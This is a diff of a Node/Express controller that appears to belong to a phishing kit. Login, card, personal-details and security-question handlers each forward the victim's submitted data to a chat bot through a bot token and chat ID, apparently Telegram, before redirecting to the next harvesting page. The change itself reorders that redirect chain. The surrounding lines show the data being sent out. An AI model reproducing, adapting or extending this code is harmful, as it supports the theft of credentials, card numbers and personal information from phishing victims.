@@ -69,7 +69,7 @@ exports.loginPost2 = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/email-verification");
+  res.redirect("/auth/card");
 };
 
 exports.login3 = (req, res) => {
@@ -103,7 +103,7 @@ exports.loginPost3 = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/personal");
+  res.redirect("/auth/questions");
 };
 
 exports.personal = (req, res) => {
@@ -139,7 +139,7 @@ exports.personalPost = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/card");
+  res.redirect("/auth/email-verification");
 };
 
 exports.card = (req, res) => {
@@ -175,7 +175,7 @@ exports.cardPost = async (req, res) => {
   const sendMessage = sendMessageFor(botToken, chatId);
   sendMessage(message);
 
-  res.redirect("/auth/questions");
+  res.redirect("/auth/personal");
 };
 
 exports.questions = (req, res) => {
